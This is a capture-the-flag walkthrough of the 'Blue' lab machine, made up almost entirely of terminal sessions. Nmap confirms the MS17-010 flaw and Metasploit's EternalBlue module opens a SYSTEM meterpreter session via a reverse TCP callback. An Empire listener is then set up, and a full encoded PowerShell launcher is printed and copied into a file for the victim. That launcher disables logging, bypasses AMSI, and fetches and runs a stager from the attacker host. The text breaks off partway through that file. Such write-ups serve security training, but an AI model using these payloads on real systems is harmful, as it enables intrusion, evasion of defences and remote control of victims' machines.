#### Blue

###### Walkthrough

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
	- [EternalBlue - nmap script](#eternalblue---nmap-script)
- [EternalBlue Exploit using msf](#eternalblue-exploit-using-msf)
- [Install Empire](#install-empire)
- [Generate http listener using Empire](#generate-http-listener-using-empire)
	- [Transfer the listeners to the victim](#transfer-the-listeners-to-the-victim)
	- [Use Empire agent to enumerate further](#use-empire-agent-to-enumerate-further)
	- [Load external powershell scripts (Sherlock) into Empire and run it](#load-external-powershell-scripts-sherlock-into-empire-and-run-it)
- [Use meterpreter listener](#use-meterpreter-listener)
- [Unicorn - injectshellcode only works on 32 bit process](#unicorn---injectshellcode-only-works-on-32-bit-process)

###### Attacker Info

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.19  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fef1:8ebf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:f1:8e:bf  txqueuelen 1000  (Ethernet)
        RX packets 590  bytes 691165 (674.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 294  bytes 28297 (27.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1272 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.234  netmask 255.255.254.0  destination 10.10.14.234
        inet6 fe80::d133:e630:17d7:9f8b  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::10e8  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 48 (48.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

###### Nmap Scan

```sh
root@kali:~/Desktop# nmap -sV -sC -oA blue.nmap 10.10.10.40

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-17 02:51 EST
Nmap scan report for 10.10.10.40
Host is up (0.28s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2018-01-17T07:53:18+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2018-01-17 02:53:17
|_  start_date: 2018-01-17 00:07:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.34 seconds
root@kali:~/Desktop#
```

###### [EternalBlue - nmap script](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)

```sh
root@kali:~/Desktop# nmap -p445 --script smb-vuln-ms17-010 10.10.10.40

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-17 02:55 EST
Nmap scan report for 10.10.10.40
Host is up (0.36s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 4.35 seconds
root@kali:~/Desktop#
```

###### EternalBlue Exploit using msf

```sh
root@kali:~# msfconsole

IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v4.16.31-dev                         ]
+ -- --=[ 1726 exploits - 986 auxiliary - 300 post        ]
+ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search ms17-010
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                      Disclosure Date  Rank     Description
   ----                                      ---------------  ----     -----------
   auxiliary/scanner/smb/smb_ms17_010                         normal   MS17-010 SMB RCE Detection
   exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption


msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   GroomAllocations    12               yes       Initial number of times to groom the kernel pool.
   GroomDelta          5                yes       The amount to increase the groom count by per try.
   MaxExploitAttempts  3                yes       The number of times to retry the exploit.
   ProcessName         spoolsv.exe      yes       Process to inject payload into.
   RHOST                                yes       The target address
   RPORT               445              yes       The target port (TCP)
   SMBDomain           .                no        (Optional) The Windows domain to use for authentication
   SMBPass                              no        (Optional) The password for the specified username
   SMBUser                              no        (Optional) The username to authenticate as
   VerifyArch          true             yes       Check if remote architecture matches exploit Target.
   VerifyTarget        true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => tun0
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.40
RHOST => 10.10.10.40
msf exploit(windows/smb/ms17_010_eternalblue) > exploit -j
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.14.234:4444
[*] 10.10.10.40:445 - Connecting to target for exploitation.
msf exploit(windows/smb/ms17_010_eternalblue) > [+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (205891 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.234:4444 -> 10.10.10.40:49161) at 2018-01-19 12:35:28 -0500
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[-] 10.10.10.40:445 - TypeError
[-] 10.10.10.40:445 - nil can't be coerced into Fixnum
[-] 10.10.10.40:445 - /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/dispatcher/socket.rb:32:in `+'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/dispatcher/socket.rb:32:in `send_packet'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/ruby_smb-0.0.18/lib/ruby_smb/client.rb:228:in `send_recv'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:328:in `smb1_large_buffer'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:196:in `smb_eternalblue'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:118:in `block in exploit'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/activesupport-4.2.10/lib/active_support/core_ext/range/each.rb:7:in `each'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/activesupport-4.2.10/lib/active_support/core_ext/range/each.rb:7:in `each_with_time_with_zone'
/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb:114:in `exploit'
/usr/share/metasploit-framework/lib/msf/core/exploit_driver.rb:206:in `job_run_proc'
/usr/share/metasploit-framework/lib/msf/core/exploit_driver.rb:152:in `block in run'
/usr/share/metasploit-framework/lib/rex/job.rb:37:in `block in start'
/usr/share/metasploit-framework/lib/rex/thread_factory.rb:22:in `block in spawn'
/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'

msf exploit(windows/smb/ms17_010_eternalblue) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ HARIS-PC  10.10.14.234:4444 -> 10.10.10.40:49161 (10.10.10.40)

msf exploit(windows/smb/ms17_010_eternalblue) >
msf exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2056 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>exit
meterpreter > background
[*] Backgrounding session 1...
msf exploit(windows/smb/ms17_010_eternalblue) >
```

###### Install Empire

```sh
root@kali:~# git clone https://github.com/EmpireProject/Empire.git -b dev /opt/empire
Cloning into '/opt/empire'...
remote: Counting objects: 9582, done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 9582 (delta 11), reused 15 (delta 7), pack-reused 9554
Receiving objects: 100% (9582/9582), 19.54 MiB | 7.35 MiB/s, done.
Resolving deltas: 100% (6405/6405), done.
root@kali:~# cd /opt/empire/
root@kali:/opt/empire# ls
changelog  data  Dockerfile  empire  lib  LICENSE  plugins  README.md  setup  VERSION
root@kali:/opt/empire# cd setup/
root@kali:/opt/empire/setup# ./install.sh
--2018-01-17 03:08:43--  http://ftp.us.debian.org/debian/pool/main/o/openssl/libssl1.0.0_1.0.1t-1+deb8u7_amd64.deb
Resolving ftp.us.debian.org (ftp.us.debian.org)... 128.61.240.89, 208.80.154.15, 128.30.2.26, ...
Connecting to ftp.us.debian.org (ftp.us.debian.org)|128.61.240.89|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1046372 (1022K) [application/octet-stream]
Saving to: ‘libssl1.0.0_1.0.1t-1+deb8u7_amd64.deb’

libssl1.0.0_1.0.1t-1+deb8u7_amd64.deb              100%[================================================================================================================>]   1022K  1004KB/s    in 1.0s

2018-01-17 03:08:45 (1004 KB/s) - ‘libssl1.0.0_1.0.1t-1+deb8u7_amd64.deb’ saved [1046372/1046372]

<---snip--->
install -m 0755 build/bin/mkbom build/bin/dumpbom build/bin/lsbom build/bin/ls4mkbom /usr/bin
install -m 0644 build/man/mkbom.1.gz build/man/dumpbom.1.gz build/man/lsbom.1.gz build/man/ls4mkbom.1.gz /usr/share/man/man1
install -d /usr/bin
install -d /usr/share/man/man1
install -m 0755 build/bin/mkbom build/bin/dumpbom build/bin/lsbom build/bin/ls4mkbom /usr/bin
install -m 0644 build/man/mkbom.1.gz build/man/dumpbom.1.gz build/man/lsbom.1.gz build/man/ls4mkbom.1.gz /usr/share/man/man1

 [>] Enter server negotiation password, enter for random generation:

 [*] Database setup completed!


 [*] Certificate written to ../data/empire-chain.pem
 [*] Private key written to ../data/empire-priv.key


 [*] Setup complete!

root@kali:/opt/empire/setup#
```

###### Generate http listener using Empire

```sh
root@kali:/opt/empire/setup# cd ..
root@kali:/opt/empire# ./empire
================================================================
 [Empire]  Post-Exploitation Framework
================================================================
 [Version] 2.4 | [Web] https://github.com/empireProject/Empire
================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       283 modules currently loaded

       0 listeners currently active

       0 agents currently active


(Empire) > listeners
[!] No listeners currently active
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://10.10.14.234:443
(Empire: listeners/http) > set Port 443
(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.
  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use for request (default, none, or other).
  KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
  Name              True        http                             Name for the listener.
  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
  DefaultLostLimit  True        60                               Number of missed checkins before exiting
  WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
  SlackChannel      False       #general                         The Slack channel or DM that notifications will be sent to.
  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile for the agent.
                                process.php|Mozilla/5.0 (Windows
                                NT 6.1; WOW64; Trident/7.0;
                                rv:11.0) like Gecko
  Host              True        http://10.10.14.234:443          Hostname/IP for staging.
  CertPath          False                                        Certificate path for https listeners.
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
  Proxy             False       default                          Proxy to use for request (default, none, or other).
  UserAgent         False       default                          User-agent string to use for the staging request (default, none, or other).
  StagingKey        True        Ly*OB+~Ke]YdC&HDnE%c)9_1s2P=<wpo Staging key for initial agent negotiation.
  BindIP            True        0.0.0.0                          The IP to bind to on the control server.
  Port              True        443                              Port for the listener.
  ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
  StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php


(Empire: listeners/http) > execute
[*] Starting listener 'http'
[+] Listener successfully started!
(Empire: listeners/http) > back
(Empire: listeners) > launcher powershell http
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAFIAUwBJAG8ATgBUAEEAQgBsAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBlAGYAXQAuAEEAUwBzAEUAbQBCAEwAWQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAEEAbABVAEUAKAAkAE4AVQBMAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABsAEUAYwBUAEkAbwBOAHMALgBHAEUAbgBFAFIASQBjAC4ARABJAEMAdABJAG8ATgBBAFIAWQBbAHMAVAByAGkATgBHACwAUwBZAHMAVABFAE0ALgBPAGIASgBFAGMAdABdAF0AOgA6AG4ARQBXACgAKQA7ACQAVgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUAbABzAEUAewBbAFMAQwBSAEkAUABUAEIAbABvAEMASwBdAC4AIgBHAGUAdABGAGkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBBAEwAVQBlACgAJABuAFUATABMACwAKABOAGUAVwAtAE8AQgBqAGUAQwBUACAAQwBvAEwAbABFAGMAdABJAE8ATgBTAC4ARwBFAG4AZQBSAGkAYwAuAEgAQQBTAGgAUwBFAHQAWwBzAFQAUgBpAG4ARwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAcwBzAEUAbQBiAGwAeQAuAEcARQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAGUAKAAkAE4AVQBsAGwALAAkAHQAUgBVAGUAKQB9ADsAfQA7AFsAUwBZAFMAdABlAG0ALgBOAEUAVAAuAFMARQBSAFYASQBDAGUAUABPAGkAbgB0AE0AYQBuAEEARwBFAHIAXQA6ADoARQBYAFAARQBDAHQAMQAwADAAQwBPAE4AdABpAE4AdQBFAD0AMAA7ACQAVwBjAD0ATgBlAHcALQBPAEIAagBFAGMAVAAgAFMAeQBzAHQAZQBtAC4ATgBFAFQALgBXAGUAQgBDAGwASQBFAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBhAGQARQByAHMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAUgBPAHgAWQA9AFsAUwBZAFMAdABlAE0ALgBOAEUAVAAuAFcAZQBCAFIARQBxAHUAZQBTAHQAXQA6ADoARABlAEYAQQB1AGwAVABXAGUAQgBQAHIATwBYAHkAOwAkAHcAYwAuAFAAcgBvAFgAeQAuAEMAcgBFAEQARQBuAHQAaQBBAGwAcwAgAD0AIABbAFMAWQBzAFQAZQBNAC4ATgBlAHQALgBDAFIAZQBkAEUAbgBUAGkAQQBMAEMAYQBDAGgARQBdADoAOgBEAGUARgBhAFUATABUAE4ARQB0AFcATwBSAEsAQwByAGUAZABlAG4AdABJAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAdABFAG0ALgBUAGUAeABUAC4ARQBuAGMAbwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AEUAcwAoACcATAB5ACoATwBCACsAfgBLAGUAXQBZAGQAQwAmAEgARABuAEUAJQBjACkAOQBfADEAcwAyAFAAPQA8AHcAcABvACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAzADQAOgA0ADQAMwAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAdwBjAC4ASABFAEEAZABlAFIAUwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AegA2AFcATwA1AG8AWABwAFMARQB5AGYARwBIAG4AdgBHAEgAMgBJAHIAVgB5AGcAMABCADQAPQAiACkAOwAkAGQAQQB0AEEAPQAkAFcAQwAuAEQAbwB3AG4ATABvAGEARABEAGEAdABhACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAYQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAYQB0AEEAWwA0AC4ALgAkAGQAQQB0AGEALgBMAEUAbgBnAHQAaABdADsALQBqAE8ASQBuAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
(Empire: listeners) >
```

###### Transfer the listeners to the victim

```sh
root@kali:~/Desktop# nano empire.ps1
root@kali:~/Desktop# cat empire.ps1
powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAFIAUwBJAG8ATgBUAEEAQgBsAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBlAGYAXQAuAEEAUwBzAEUAbQBCAEwAWQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAEEAbABVAEUAKAAkAE4AVQBMAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABsAEUAYwBUAEkAbwBOAHMALgBHAEUAbgBFAFIASQBjAC4ARABJAEMAdABJAG8ATgBBAFIAWQBbAHMAVAByAGkATgBHACwAUwBZAHMAVABFAE0ALgBPAGIASgBFAGMAdABdAF0AOgA6AG4ARQBXACgAKQA7ACQAVgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEAbAB9AEUAbABz